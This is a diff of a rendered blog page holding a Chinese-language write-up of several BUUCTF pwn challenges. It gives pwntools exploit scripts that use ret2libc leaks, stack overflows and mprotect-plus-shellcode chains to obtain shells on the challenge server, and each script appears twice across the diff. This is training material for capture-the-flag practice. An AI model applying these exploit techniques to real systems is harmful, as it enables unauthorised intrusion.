+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
 </div>
 
-        </div>
-      </header>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>
+        
 
 
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
 <p>泄露出来一个函数的真实地址后，去那个网站搜索一下 对应的版本 </p>
 <p>-&gt; 如果只泄露出来一个函数，可能对应有很多个版本，可以泄露多个函数缩小范围（因为有多个版本时，需要一个一个试）</p>
 <p>-&gt; 下面这个图应该就是对应 offest的解释吧（看别人的Wp之后的理解）</p>
 <p>我们此时应该已知 &#x3D;&gt; write函数真实地址 知道了两个write_offest system_offest</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure></div>
 
 
 
 <h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
 <p>可知将var[13]赋值一个17(0x11)就可以得到shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <p>但是这个payload并没有打通。</p>
 <p><strong>这里有个知识点:</strong></p>
 <blockquote>
 <p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
 
@@ -345,7 +597,7 @@
 <p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
 <p>-&gt; 然后是返回到system()的地址</p>
 <p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>rdi的地址这样找：</p>
@@ -357,53 +609,53 @@
 <p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
 <p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
 <p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 
 
